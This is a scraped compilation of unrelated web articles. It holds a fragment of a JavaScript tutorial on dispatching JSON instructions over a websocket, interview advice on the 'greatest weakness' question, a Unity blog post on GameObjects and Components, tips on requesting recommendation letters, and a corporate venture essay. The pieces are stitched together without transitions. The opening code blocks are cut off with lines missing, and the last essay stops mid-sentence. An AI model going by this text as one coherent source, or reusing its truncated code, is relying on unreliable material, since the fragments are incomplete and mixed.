<span>}</span></code></pre><p>This JSON would translate to <code>drawLine({x: 0, y: 0}, {x: 1, y: 1},"blue")</code></p><p>We could support this pretty simply. Here’s how our <code>onMessage</code> could look:</p><pre><code><span>webSocket</span><span>.onMessage</span><span>(</span><span>instruction</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>

<span>})</span></code></pre><p>That seems like it would work!</p><p>Let’s see if we can clean this up. Here’s our JSON:</p><pre><code><span>{</span>
<span>  instructions: [</span>

<span>  ];</span>
<span>}</span></code></pre><p>Well, since <em>every</em> instruction has a <code>functionName</code>, and an <code>args</code>, we don’t really need to spell that out. We <em>could</em> write it like this: </p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>]],</span>
<span>}</span></code></pre><p>Nice! We changed our object in favor of an array. To handle that, all we need is a rule: <strong>the</strong> <strong><em>first</em></strong> <strong>part of our instruction is the function name, and the <em>rest</em> are arguments.</strong> If we wrote that down, here’s how our <code>onMessage</code> would look: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>

	    	<p>When a hiring manager asks the weakness interview question, “What is your greatest weakness?” it’s best to be prepared with an answer. And a specific weakness in mind. This type of interview question is aimed at learning about a candidate’s core competencies in advance of hiring. Competencies are demonstrable characteristics and skills that improve a job's efficiency and effectiveness (or performance). These types of interview questions can help an employer predict the future job performance of a job candidate.</p>

<p>This common interview question comes in many forms. The interviewer may ask, “What is your biggest weakness?” or “What do you feel your greatest strength and weaknesses are?” When considering weaknesses to mention, it can be helpful to refer to a list of weaknesses that set examples for a potential answer. A job seeker should prepare to be asked this common interview question and prepare their answer with a real weakness they feel comfortable sharing.</p>

<p>This interview question is normally asked during the “on-site interview” portion of the interview process. It is less common for this question to be asked during the phone interview or pre-screen interview stage from a prospective employer. Regardless of the interview type, when there’s an upcoming interview, it is always suggested to prepare a “good answer” to this question and be ready to respond when asked this dreaded interview question.</p>

<p><img src="https://www.algrim.co/images/weaknesses-interview-question.jpg" alt="weaknesses interview question"></p>

<h2>Why "What Is Your Greatest Weakness" is Asked</h2>

<p>This interview question is asked to candidates to see how self-reflective they might be, how humble they might be, and if they have humility. The exercise aims to measure core competencies as well as the ability to be self-disciplined with their work.</p>

<p><strong>Tip:</strong> Keep seeing the phrase "core competencies?" Curious about what a core competency is? A core competency is a concept in management theory introduced by <a href="https://en.wikipedia.org/wiki/C._K._Prahalad">C. K. Prahalad</a> and <a href="https://en.wikipedia.org/wiki/Gary_Hamel">Gary Hamel</a>. It is defined as “a harmonized combination of multiple resources and skills that distinguish a firm in the marketplace.” And therefore, it is the foundation of a companies’ competitiveness.</p>

<p>When answering this interview question, the hiring manager doesn't care about what the candidate answers with, but how they answer it. The purpose of the exercise is for the employee to give themselves a small performance review.</p>

<p>According to <a href="https://www.bamboohr.com/hr-glossary/performance-review/">BambooHR</a>, "A performance review is a formal assessment in which a manager evaluates an employee's work performance, identifies strengths and weaknesses, offers feedback, and sets goals for future performance."</p>

<p>We can see from the interview question that it promotes the opportunity for the employee to be humble and identify a weakness that can be improved. When finding a weakness, use a weakness that is subtle. Rather, a strength that can be improved and not a weakness or missing talent.</p>

<p>For example, a great weakness would be <strong>patience</strong>. Since it is a strength, but can always be improved. Everyone can improve their patience. And patience will pay dividends for any business. It's a question that tests the candidate and shows whether or not they're a "good fit" for the business.</p>

<h2>Interview Question Answer Strategy</h2>

<p>The best strategy for answering this interview question is to answer with weaknesses that can also be considered strengths. Or another way to phrase it is to use a weakness that can be easily controlled or utilized in certain situations. Consider this a “good weakness.”</p>

<p>A poor weakness that does not do this is:</p>

<p>
I feel like I can get frustrated too easily.
</p>

<p>A good weakness that can be utilized as strength is:</p>

<p>
I can find myself having a hard time letting go of a project that I poured my heart into.
</p>

<p>This makes any weakness you describe an “acceptable” weakness to the interviewer or hiring manager. It also refers to a weakness that is presentable “on the job” rather than speaking about a personal weakness. For example, a personal weakness would be, “I feel like I get stressed out under pressure.” This is simply an irrelevant weakness to the hiring manager.</p>

<p>While many resources claim that referring to a <a href="https://www.algrim.co/879-skills-list-for-the-resume">soft skill</a> or hard skill through the interview answer is correct, it’s more effective to use a weakness that can be harnessed as a strength for the employer. There are two reasons for this. First, the interview answer will be more clear. Second, the story being told by the candidate will be shorter, and skill will still present itself to the hiring manager. The risk of using a story that describes a <a href="https://www.algrim.co/879-skills-list-for-the-resume">soft skill</a> is that it has the potential of mentioning a non-essential skill for the role. A clear, concise, and simple reference to the weakness should be sufficient.</p>

<p>When answering, the answer should take no more than 90-seconds to recite. If the interviewer asks to learn more about that weakness, be prepared to tell a short story that describes the flaw. The story should use a <a href="https://www.themuse.com/advice/star-interview-method">STAR response</a>. This is a situation, task, action, and result. Or another way to phrase it is that the answer should describe a mistake that embodies the weakness. Only use this method if the interviewer wants to learn more about the weakness.</p>

<p>Always use a previous job or current job as the basis for the answer. Never refer to a sporting team or extracurricular activity unless there is no prior work experience and relevant employment history to refer to. If possible, refer to methods for correcting the weakness at the moment or what might be done the next time the weakness presents itself in a work situation.</p>

<p>Job candidates should follow these answer strategy guidelines and best practices:</p>

<ul>
<li>Avoid using a personality trait or bad habit as a "weakness."</li>
<li>Provide a specific example or concrete example of the "weakness" in use.</li>
<li>Provide insight into how the weakness could be utilized in a "positive light" or used as a personal strength.</li>
<li>It's okay to mention a "weak spot" or "weak area" in professional life. Try to coordinate these areas as also being "core strengths." Meaning, the weakness is a strength, too.</li>
<li>If the weakness is influenced by "external factors" be sure to explain that to the hiring manager without the answer sounding like "blame."</li>
</ul>

<p><strong>Tip:</strong> Job candidates who are confused about how to answer this interview question should consider performing an "informational interview." An <a href="https://career.berkeley.edu/Info/InfoInterview">informational interview</a> is defined as an "informal conversation you can have with someone working in an area of interest to you. It is an effective research tool and is best done after preliminary online research.  It is not a job interview, and the objective is not to find job openings." Informational interviews can provide insight into company culture and requirements of jobs not listed on a job description. And can be useful in obtaining career advice from employed personnel.</p>

<h2>List of Weaknesses and Sample Answers</h2>

<p>Use these weaknesses and sample answers for a job interview. Be sure to answer with a genuine weakness that aligns with what the resume and cover letter may indicate. This job interview question is considered a “tough question” by the employer but one that displays personality and individuality to a potential employer. Spend time considering which weakness is most fitting and consider an appropriate response that's personal.</p>

<h3>1. I can be too detail-oriented.</h3>

<p>Sample answer: “I can find myself getting too heavily involved in the details of a project. While this is an indicator of my passion for the project, I can spend too much time focusing on the minor details and forget about the holistic needs of the team.”</p>

<h3>2. I can care a little too much about our customers.</h3>

<p>Sample answer: “At my previous job, I found myself using too much empathy. In certain circumstances, like in a nursing home, you have to distribute empathy equally. I found it difficult not to emotionally connect with a few patients.”</p>

<h3>3. I have a hard time saying “no.” </h3>

<p>Sample answer: “Saying no is really difficult for me. I like to make sure that our customers and team members are happy. Though, I recognize that if I say ‘Yes’ all the time, I might not be able to follow through with my promise. And this lets my team or customers down even more.”</p>

<h3>4. I have a hard time letting go of a project.</h3>

<p>Sample answer: “When I’ve spent a healthy amount of time and effort on a project, I have a hard time letting others get involved. At my previous job, there was a project I spent 12-months on. And when another team member came to take it over, I found it difficult not to periodically check in on the project and potentially micromanage.”</p>

<h3>5. I sometimes lack confidence.</h3>

<p>Sample answer: “When others ask my opinion, I struggle to present my thoughts and opinions even though I feel they are on target with what the company needs or the project needs. This is simply me not being able to ‘speak up’ for myself.”</p>

<h3>6. It can be difficult to maintain a healthy work/life balance.</h3>

<p>Sample answer: “When I get really passionate about a project, I can spend a little too much time on it and find myself getting a little burnt out. I need to remember that spending time away from a project is healthy.”</p>

<h3>7. I can find adaptability to be too comfortable.</h3>

<p>Sample answer: “I get concerned about the fact that I’m too comfortable with adaptability. Changing environments and the changing of hands. I’d like to think that stability is a good thing at times and is something I should be comfortable with as well.”</p>

<h3>8. I often find myself working too many hours and getting burnt out.</h3>

<p>Sample answer: “Some days I simply can’t put my work down. And I forget that I’m going to have to come back to work the next day. I might work late into the night and get incredibly passionate about a problem. I have to remember to pace myself and think clearly.”</p>

<h3>9. I have a hard time shifting from one project to another.</h3>

<p>Sample answer: “If I’m particularly passionate about one project, I can find it hard to shift into another …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We already discussed
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#gameobject">Game Objects</a> and
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#component">Components</a> as two
of the fundamental building blocks of the Unity Engine. Today, we’ll discuss
their programmatic representation.</p><p><em>This is <strong><a href="https://blog.eyas.sh/tag/unity-for-software-engineers">Unity for Software Engineers</a></strong>,
a series for folks familiar with software development best practices seeking an
accelerated introduction to Unity as an engine and editor. More is coming over
the next few weeks, so <a href="http://eepurl.com/gVgusL">consider subscribing</a> for
updates.</em></p><p>The Unity Engine <em>runtime</em> is primarily written in C++, and much of the Engine’s
primitives (such as the game objects and their components) live in C++ land.
You’ll also know that the Unity Engine <em>API</em> is in C#. The API gives you access
to all of Unity’s native objects in a way that<!-- -->—<!-- -->save for a few pitfalls
we’ll discuss today<!-- -->—<!-- -->feels like intuitive, idiomatic C#.</p><figure><p><img src="https://blog.eyas.sh/e1e4978ec3c78301c0c6b929c61f8bf7/object-hierarchy.svg" alt="A GameObject, MonoBehaviour, and ScriptableObject all inherit from UnityEngine Object."></p><figcaption><p>The <em>C#</em> class hierarchy of <code>UnityEngine.Object</code>, <code>GameObject</code>,
<code>ScriptableObject</code>, <code>Component</code>, and their children. This should map to the
<em>conceptual</em> hierarchy of how to think about these objects, though sometimes the
runtime implementation will look different.</p></figcaption></figure><h2 id="unityobject">UnityEngine.Object</h2><p>At the top of the Unity Object hierarchy sits <strong><code>UnityEngine.Object</code></strong>. For the
most part provides a <code>name</code> string, an <code>int GetInstanceID()</code> method, and a bunch
of equality comparers.</p><p>The class also provides a <code>static void Destroy(Object obj)</code> method (and some
overloads) that destroys a <code>UnityEngine.Object</code> and any of its subclasses. When
an Object is destroyed, the <em>native</em> part of the object is freed from memory,
and the smaller <em>managed</em> part will be garbage collected <em>at some point</em> after
there are no more references to it.</p><p>Because your valid reference to a <code>UnityEngine.Object</code> can point to a destroyed
native object, <code>UnityEngine.Object</code> overrides C#‘s <code>operator==</code> and <code>operator!=</code>
to make a destroyed Object <em>appear</em> null. Simply accessing methods on a
destroyed object will return <code>NullReferenceException</code>, albeit with a friendlier
error message that tells you which object you were trying to access.</p><h2 id="gameobject">GameObject</h2><p>A <strong>GameObject</strong> derives from Object and represents anything in your scene.</p><p>Let’s start at a high-level: A GameObject inherits a name and instance ID from
its parent. Otherwise, conceptually, a GameObject</p><ul><li>has a list of <a href="#component"><strong>Components</strong></a> on it,</li><li>has a <code>tag</code> string for organizational purposes, and</li><li>belongs to a <a href="https://docs.unity3d.com/Manual/Layers.html">layer</a>.</li></ul><p>A GameObject’s state</p><ul><li>is the product of all of its <em>Components’</em> state, and</li><li>whether an object is active or not.</li></ul><p>Let’s dig a bit deeper. When starting, most of the interesting stuff in a
GameObject is in its <strong>Components</strong>. A GameObject has at least one Component:
its <a href="https://docs.unity3d.com/ScriptReference/Transform.html"><code>Transform</code></a>. A
Transform describes the position and rotation of the GameObject. A Transform
includes helper properties that show an object’s <em>absolute world</em> position and
rotation, as well as the position and rotation <em>relative</em> to its parent. In the
Editor, the Transform position and rotation are set from the <em>parent relative</em>
variants.</p><p>Since every GameObject has a Transform (and also, given that a Transform is
frequently needed/accessed), the GameObject directly exposes a
<code>Transform transform</code> public property.</p><p>You can access individual components from <code>T GetComponent&lt;T&gt;()</code>, or lists of
components from <code>T[] GetComponents&lt;T&gt;()</code>, etc. These methods search through all
components on a GameObject and return ones with a compatible type (or null, if
none exist in the singular case). Since these methods search through components
and check type compatibility, it is often recommended to cache this lookup.</p><p>If you are building/extending a GameObject by hand, you can always use
<code>T AddComponent&lt;T&gt;()</code>. In most cases, however, you’re better off using the
Editor.</p><p>Individual Objects (a Component or ScriptableObject) might refer to other
<code>GameObjects</code> in a few ways:</p><ul><li><p><strong>By reference</strong>. By exposing a <code>GameObject</code> <em>serialized field</em> that you
then set from the inspector.</p><p><em>We have discussed serialization extensively throughout the series:
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#serialization">as a fundamental concept</a>
and in our tour of the Editor, when
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt4-editor-tour#inspector">describing the Inspector</a>,
and the <a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt2-six-practices">practice</a> of using
the Inspector as an injection framework</em>.</p></li><li><p><strong>Using tags</strong>. Every Game Object can have a <em>tag</em> string. You can find
objects in the scene using that tag through the static functions
<code>GameObject.FindGameObjectsWithTag</code> and <code>GameObject.FindGameObjectWithTag</code>.
A GameObject also exposes a public <code>bool CompareTag(string tag)</code> method.</p><p>This is a quick-and-dirty way to get the job done, but is still a popular
way. A common use of this in the wild is to have a <code>"Player"</code> tag to find
the Player. Ideally, these methods should not be called every frame, so if
you have to use them, consider caching the result.</p></li><li><p><strong>Using layers</strong>. A layer is an <code>int</code> between 0 and 31. Every Game Object is
in exactly one layer.</p><p>While you can’t directly look up all objects in a layer, if you already have
a reference to a GameObject (e.g., in a collision event), you can check a
GameObject against a
<a href="https://docs.unity3d.com/ScriptReference/LayerMask.html"><code>LayerMask</code></a>. A
<code>LayerMask</code> is typically used in functions like <code>Physics.Raycast()</code>. This
allows you to find objects with colliders intersecting with a given <em>ray</em>.
Passing a <code>LayerMask</code> to <code>Physics.Raycast()</code> will only return objects within
the specified set of layers.</p><p>Inside the Unity Engine, <em>Cameras</em> make heavy use of layers. E.g., you can
have one camera that renders “everything but UI”, and overlay another camera
for an in-game HUD, etc.</p></li><li><p><strong>Using indirect references</strong>. There are many reasons why the methods above
might be insufficient: you might not want to use tags to avoid depending on
copy-pasted strings, and layers might not fit your use case. If referencing
a fellow object in-scene is not an option (e.g., you’re dealing with a
dynamic set of objects or don’t have access to the current scene objects in
the context you need this reference, etc.), then you might want to look
further.</p><p>For this, an increasingly popular concept is <em>runtime sets</em> Scriptable
Objects. You can read more about this in Unity’s how-to article on
<a href="https://unity.com/how-to/architect-game-code-scriptable-objects">architecting your game with ScriptableObjects</a>,
based on <a href="https://www.youtube.com/watch?v=raQ3iHhE_Kk">the talk</a> by Ryan
Hipple. If you have an hour to spare, you might want to watch the whole
thing.</p></li></ul><p>A GameObject also exposes a <code>BroadcastMessage</code> and <code>SendMessage</code> functions that
propagate <em>messages</em> (described in the <a href="#component"><strong>Component</strong></a> section) to
all components in or under it.</p><figure><p><span>

User-implemented Components will usually extend the <code>MonoBehaviour</code> subclass
(more on that later).</p><p>A Component inherits a name and instance ID from its parent. Otherwise,
conceptually, a Component</p><ul><li>always <em>belongs</em> to a single GameObject, exposed as a public
<code>GameObject gameObject</code> property, and</li><li>can receive <strong>messages</strong>, driving much of its behavior.</li></ul><p>The state of a component on an <em>active</em> GameObject lies entirely in its
implementation.</p><p>In addition to its <code>GameObject</code>, a component exposes shorthand properties and
methods such as <code>Transform transform</code>, <code>T GetComponent&lt;T&gt;()</code>, etc. These are
simply convenience shorthands for accessing those same methods on the
corresponding <code>gameObject</code>.</p><p>The most important functionality of a Component is driven through <strong>Unity
Messages</strong> (also sometimes called <em>Unity Event Functions</em> when referring to
built-in messages). These are effectively callbacks functions triggered <em>by the
Engine</em> in certain situations. Every Component will receive a <code>Awake()</code>,
<code>Start()</code>, <code>Update()</code> and other messages, for example. The Unity Docs on the
<a href="https://docs.unity3d.com/Manual/ExecutionOrder.html">Order of Execution</a> of
these messages is a convenient resource.</p><p>To have your component receive a particular message, simply add a
<em><code>private void</code></em> method with the appropriate message name. The runtime will use
reflection to call these messages, when applicable. This is why you don’t see an
<code>override</code> directive on these messages. Messages like <code>Update</code>, <code>LateUpdate</code>,
and <code>FixedUpdate</code> are inspected once per type, so don’t worry about reflection
being used in every frame. See more details in the
”<a href="https://blogs.unity3d.com/2015/12/23/1k-update-calls/">10000 Update() calls</a>”
Unity blog post for more information.</p><p>A <strong><code>Behaviour</code></strong> is a type of component that <em>can be enabled or disabled</em>. When
a <code>Behaviour</code> is disabled, <code>Start</code>, <code>Update</code>, <code>FixedUpdate</code>, <code>LateUpdate</code>,
<code>OnEnable</code>, and <code>OnDisable</code> messages are not called.</p><p>A <strong><code>MonoBehaviour</code></strong> is a <code>Behaviour</code> that also enables using
<a href="https://docs.unity3d.com/Manual/Coroutines.html">Coroutines</a>.</p><h2>A Note on Inactive Objects and Disabled Components</h2><p>A GameObject in a loaded scene will exist in memory until the object is
<em>Destroyed</em> explicitly or the scene is unloaded. A GameObject can be set to
<em>inactive</em>, which will cause it to stop receiving <code>Update</code> (and related) events.</p><p><strong>When an object is <em>created</em></strong>, the messages called on a component depend on
if: (1) the GameObject is active, and (2) the component is enabled:</p><table><thead><tr><th></th><th>GameObject is <em>active</em></th><th>GameObject is <em>inactive</em></th></tr></thead><tbody><tr><td>Component is Enabled</td><td><code>Awake</code>, <code>OnEnable</code>, <code>Start</code></td><td><em>Component implicitly disabled</em></td></tr><tr><td>Component is Disabled</td><td><code>Awake</code></td><td><code>Awake</code></td></tr></tbody></table><p><strong>When an object is <em>set to active</em> or a <code>Behaviour</code> is <em>set to enabled</em></strong>:</p><ul><li><code>OnEnable</code> will be called.</li><li>If <code>Start</code> has never been called on this <code>Behaviour</code>, it will be called
exactly once.</li></ul><h2 id="takeaways">Takeaways</h2><p>Some takeaways of all this:</p><ol><li>A Unity object might <em>appear to become <code>null</code></em> when destroyed. <code>== null</code>
checking does more than you think.</li><li>As a result, null-coalescing operators (<code>??</code>, <code>??=</code>) and null-conditional
operators (<code>?.</code>, <code>?[]</code>) don’t work as expected.</li><li>Yes, your Unity Messages can be private!</li><li>Don’t create abstract classes that unnecessarily declare <code>Update</code> or other
messages to make overriding easier; that’ll result in the engine always
calling these events.</li><li>Disabling an Object or Component is a great way to limit its game logic or
save on CPU-bound effort, but these objects still have a memory overhead.</li></ol></div></div>]]>

	    	<p>As a resigning employee, asking for a letter of recommendation (or sometimes referred to as a reference letter) from a current employer, colleague, supervisor, manager, or boss can be a great way to collect a helpful job application asset for the future. When leaving on good terms with a company, this provides the employer with a desire to write a strong letter and overall positive recommendation for future employment purposes.</p>

<p>Asking for a recommendation letter is a fairly simple process. It involves showing gratitude to the letter writer for their future efforts, providing the writer with goals or objectives for the letter, and setting a deadline for when the letter is required (helpful for medical school and college application purposes).</p>

<p>In most cases, recommendation letters are requested for professional purposes, which alleviates the need to punctuate a deadline. When applying for an MBA program or other graduate school (sometimes referred to as “grad school”) needs, for example, providing the writer with the application deadline and application materials (like the application itself) can be useful.</p>

<p><img src="https://www.algrim.co/images/how-to-ask-for-a-letter-of-recommendation.jpg" alt="how to ask for a letter of recommendation"></p>

<p><strong>Tip:</strong> To receive a “glowing letter of recommendation”, provide the letter writer with a few guidelines. Always address the reader by name in the greeting, use the <a href="https://www.canr.msu.edu/news/challenge_action_result_car_statements_part_1">CAR format</a> (Challenge/Action/Results) and reference facts of the applicant versus subjective claims.</p>

<p>When asking the recommendation writer to provide insights into the letter. Here are some examples:</p>

<ul>
<li>Including test scores and school projects that admissions officers might appreciate.</li>
<li>Including an extracurricular activity that showed leadership, promise, or drive.</li>
<li>Previous employment experiences that show competencies, skills, and teamwork.</li>
</ul>

<p>Depending on the type of recommendation request, these would be helpful guidelines to send to the recommendation writer for what the letter should contain.</p>

<p><strong>Tip:</strong> Collecting multiple letters from professional references can be helpful for any job seeker.</p>

<p>Here are professionals who may be able to write a recommendation letter:</p>

<ul>
<li>A pastor or minister.</li>
<li>A close family acquaintance.</li>
<li>A previous manager, boss, or supervisor.</li>
<li>A counselor or guidance counselor.</li>
<li>A professor, teacher, or faculty member.</li>
</ul>

<p>All of these individuals would be classified as a good “recommender” to ask for a letter of recommendation.</p>

<p><strong>Tip:</strong> It can be useful to ask a professor for a letter of recommendation during their regularly scheduled office hours.</p>

<p>Recommendation letters can be useful for job seekers, students, and general professionals. They can be used to show a potential employer the worthiness of employment (competencies, skills, personal qualities, and meeting qualifications). Letters of recommendation can be useful for recent graduates who are applying for an internship program. And lastly, for students who are applying for a graduate program, financial aid, a scholarship, or other admissions committee requirements.</p>

<p><strong>Tip:</strong> If seeking a college recommendation letter, it’s best for students to ask for their letters of recommendation during junior year of their schooling. This can “beat the competition” when it comes to the other student body who may be requesting letters of recommendation from their teacher or other faculty. Students should provide their letter writers with their personal statement for college to help assist the writer in creating a great letter of recommendation.</p>

<h2>How to Ask for a Letter of Recommendation</h2>

<p>Below are steps for job seekers and students to consider when asking for a letter of recommendation:</p>

<ul>
<li>Gather a list of professionals, professors, or faculty to request a letter from.</li>
<li>Speak with each one over the phone or in person and request their positive letter of recommendation.</li>
<li>Send them an email outlining objectives for the letter and any job application or college application details (including the deadline). Or a cover letter, resume, and other candidate information.</li>
<li>Upon receiving the recommendation letter, send a thank you email for their time and effort.</li>
</ul>

<h3>Asking a teacher or professor to write a recommendation letter</h3>

<p>Include the following information in the email request to a professor or teacher.</p>

<p><strong>Classwork:</strong> It can be beneficial to write a summary document outlining classwork, grades, and achievements so that the professor can reference when writing the recommendation letter. A professor who teaches hundreds of students is going to need something to look at when they start to write a letter.</p>

<p><strong>A resume:</strong> Including a resume can be helpful for the request of a recommendation letter. It can show the professor what career path the student wants to take and what they are trying to communicate or convey to future employers through prior work experience, skills, and more.</p>

<p><strong>A deadline:</strong> Asking a professor to complete the recommendation letter by a certain date can ensure that the student receives the proper recommendation in a timely manner. This can ensure that the student doesn't miss the opportunity to submit the job application before waiting for the professor to complete the letter. This can be especially helpful if using the recommendation letter for a graduate study program or scholarship request.</p>

<p>Be sure to check school policies on asking for letters of recommendation. Some professors, teachers, and institutions force the student to submit a <a href="https://www.philau.edu/undergrad/inc/documents/recommendationform.pdf">recommendation form</a>. This form puts a formal request to the professor to ask for a letter of recommendation.</p>

<p><strong>Tip:</strong> Heard the term "rec letter?" A "rec letter" is a letter of recommendation or recommendation letter. This is a "slang" term for the name recommendation letter.</p>

<h2>When to Ask for a Recommendation Letter</h2>

<p>While it's more common to ask professionals to be a reference, asking for a letter of recommendation can happen at <strong>any</strong> time in a professional's career or student's tenure.</p>

<p>Contrary to what most professionals and students believe, there's always a great time to be asking for a letter of recommendation. The best time to ask for a letter of recommendation is when a professor or manager is impressed by the efforts of the letter requester. When this occurs, that is the perfect timing to be asking for a letter of recommendation.</p>

<p>For example, let's say a professional completed a major milestone, delivered for a client. And the manager was impressed with that work. During that time, it's best that the employee ask their manager for a letter of recommendation. It's best to confide in the manager and tell them that the letter of recommendation does not have any implication on current employment (the employee is not resigning) and the employee is asking for the confidential letter because it "feels like the right time."</p>

<p>Students can follow this same idea. When a professor or teacher is happy with the student's coursework, it may be a great time to be asking for a letter of recommendation. For a student, asking earlier than the other classmates can be a wonderful idea. Most students wait until the end of the year to request a letter of recommendation, forcing the professor to be "pressured" by a number of students applying to grad school or other post-secondary institutions.</p>

<p>The perfect time to ask for a letter of recommendation is when a significant <strong>accomplishment</strong> has been made. For professionals who have submitted their two weeks' notice, it's okay to ask the manager for a letter of recommendation toward the end of their employment. It's advised to ask the manager for a letter of recommendation before the final day of employment.</p>

<p>If an employee waits until the final day of employment to ask for a letter of recommendation, the manager might not feel "compelled" to provide a nice letter of recommendation to the employee. After providing a two weeks' notice, wait <strong>one week</strong> before asking for a letter of recommendation. <strong>Why</strong> Because submitting a two weeks' notice, then immediately requesting a letter of recommendation can be misinterpreted by the manager. It might communicate that the employee is "eager" to leave or resign from their position.</p>

<h2>How to Ask in Person</h2>

<p>Meeting by phone or in-person (face-to-face) to ask for a letter of recommendation is considered a polite act. Here's what to say when speaking with a professional or employer, asking for a letter of recommendation:</p>

<p>
"Thanks for speaking with me today Sarah. It's been an absolute pleasure being able to work with you. I feel like you've been a mentor to me and I'm sincerely grateful for being able to watch you work, learn from your work, and continue my career. I'd love it if you could be a reference for me and write a letter of recommendation for my future career efforts? I can provide insights into what I'm looking for a letter to display in terms of my skills, qualities, traits, and core competencies. Would you feel comfortable writing me a letter of recommendation?"
</p>

<h2>Recommendation Letter Request Email Sample</h2>

<p>Below is a sample letter request email. Job seekers and students should avoid writing a written request for a recommendation as it can take longer to receive the letter.</p>

<p>Email subject line: Recommendation Letter Request</p>

<div><p>
Hey John —</p><p>

I want to thank you for the opportunity to work together over the past few years. You’ve been a mentor to me, and I will be carrying everything you’ve educated me into my next role. I was hoping you might be able to write me a letter of recommendation that I can use for future employment opportunities.</p><p>

If possible, I’d love to refer to a couple of qualities that I think will assist me in my career:</p><ul>
<li>Leadership qualities and teamwork.</li>
<li>Time management and organizational skills.</li>
<li>Any other significant experiences you have had with me.</li>
</ul><p>

I would love to get the recommendation letter within the next 4 business days if I can.</p><p>

Thanks so much, John,<br>
Robert

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>In his classic book, “<a href="https://www.amazon.com/dp/B007AIXKUM">The Founder’s Dilemmas: Anticipating and Avoiding the Pitfalls That Can Sink a Startup</a>,” former Harvard Business School professor and startup researcher Noam Wasserman introduced the idea that most entrepreneurs have to make a deliberate choice between optimizing for financial returns (“Rich”) or optimizing for control of their company (“King”). His research showed that very few get to be both Rich <em>and</em> King — that’s the rare exception. Most founders typically must decide between “bootstrapping,” which maintains equity ownership but limits growth by having to self-fund growth initiatives via cash flow, or raising outside capital, which accelerates growth but risks diluting founder equity and diminishing the founder’s decision rights on the board of directors.<br></p><p>At High Alpha Innovation, we partner with large corporations to innovate via systematically launching new ventures and building corporate venture studios. We are fortunate to interact frequently with forward-looking executives who are always looking for novel ways to unlock meaningful growth. No matter which type of executive we speak to — a C-suite member, a business unit GM, an innovation leader, a corporate venture capital investor (“CVC”), or even a corporate development deal-junkie — they all seem to face the same Rich versus King tradeoff decision as the entrepreneurial founder when considering launching new ventures. (Note: we do not consider corporate divestitures of more established businesses to be a “new venture” for the purposes of this post).<br></p><p>On one side are executives that might push the organization to invest in a fast-growing VC-backed early stage startup, arguing that using the balance sheet to make a minority equity investment won’t impact the P&amp;L while delivering both high financial returns via eventual sale or IPO of the company as well as meaningful strategic returns through a commercial relationship with the startup that creates differentiation, accelerates time-to-market, or acquires expertise or talent for the corporation. This can be a compelling and valid argument.&nbsp;<br></p><p>On the other side are executives that might push the organization to build new ventures internally that are fully-owned and controlled, arguing this maximizes both financial returns (“we keep 100%, not just a minority”) as well as strategic returns (“we pick the team and dictate the roadmap, so we can customize the new venture to meet our unique strategic needs”). This is also a compelling and valid argument.<br></p><p>Both CVC and internal venture investments have the ability to meet or exceed expectations, but it is <em>always</em> harder than corporations expect and never goes exactly to plan. Many senior corporate executives we speak to, off the record, are frustrated with their CVC investments and internal venturing efforts falling short of lofty financial and strategic goals. “So, which is the better approach: CVC investing or internal venturing?!”&nbsp;<br></p><p>We believe this is the wrong question to ask and a false dichotomy. Successful corporate innovation requires a portfolio approach and having many different tools in the toolkit (e.g. M&amp;A, partnerships, etc.). In certain circumstances CVC investing makes sense and in other circumstances internal innovation may be the better path (a likely topic for a future post). Each tool in the corporate innovation toolkit has its own pros and cons.&nbsp;<br></p><p><strong><em>The right question to ask is why a particular investment did not deliver against expectations. At High Alpha Innovation, we believe many corporations are setting themselves up for failure because they do not consider the tradeoff between being “Rich” or being “King,” and do not explicitly make the hard decision to optimize for one and manage to the other (or somewhere in between - more on that later). They want to have their cake and eat it too, but many times it can end up in their face. This difficult tradeoff decision is what we call the Corporate Founder's Dilemma.</em></strong></p><p>For CVC funds that are structured and operate like standalone VC funds (such as <a href="https://www.gv.com/"><strong>GV</strong></a>, which spun out of Google in 2009), having control or influence over the operations of a portfolio company is usually less of an issue as the CVC has already made the explicit decision to optimize for financial returns. But it’s much more tricky for most corporations whose CVC arms have both a financial and strategic mandate. We believe CVC investments have a higher likelihood of making the corporation “Rich” than internal ventures, as external startups can move faster, tap into the private capital markets to accelerate growth, attract top talent, and avoid the typical innovation barriers within corporations. Strategic returns are harder to deliver, though, as it is hard for many corporations to NOT act like a “King” as they may be used to calling all the shots with vendors and partners. Most CVC investors understand that the corporation is giving up control or influence, but we’ve seen many of the commercial relationship owners between the corporation and startup not understand this, or simply do not accept it. These internal commercial leaders are focused (rightly so) on optimizing for internal business unit success and this can lead them to misinterpret or misuse the CVC investment as a right to force the startup to do whatever it takes to make the internal leader and business unit successful. In our experience, this misalignment of incentives between internal commercial owner, CVC and startup management teams can irreparably damage the relationship when not managed closely and lead to missed financial and strategic targets for both the corporation and the startup.<br></p><p>In regards to internal wholly-owned ventures, if a corporation owns 100% of the new venture, staffs it with salaried and bonused employees without equity ownership, and shares centralized services (e.g. finance, accounting, etc.) with the core business, we see that as just a new business unit no matter what the corporation might want to call it. We hear about many of these “new ventures” (or business units) struggling to gain internal or external traction. We believe this is because most internal ventures are “bootstrapping” without even realizing it. Established public corporations, just like bootstrapped startups, typically self-fund internal growth initiatives through cashflows meaning the growth capital available to new ventures is inherently quite limited. Many innovation leaders we speak with find it incredibly hard to raise sufficient internal capital, especially within public companies that face short-term pressures from Wall Street, for new ventures that typically lose money in the near-term and have uncertain payoffs in the longer-term. Even if a new internal venture can land some internal seed capital and begin to show traction that might warrant additional funding to accelerate growth, allocation of this scarce growth capital is constrained to specific times of year (e.g. annual budgeting) rather than released as appropriate based on performance-based milestones. To boot, these internal ventures also face most, if not all, of the other typical corporate innovation challenges: fighting for scarce resources and 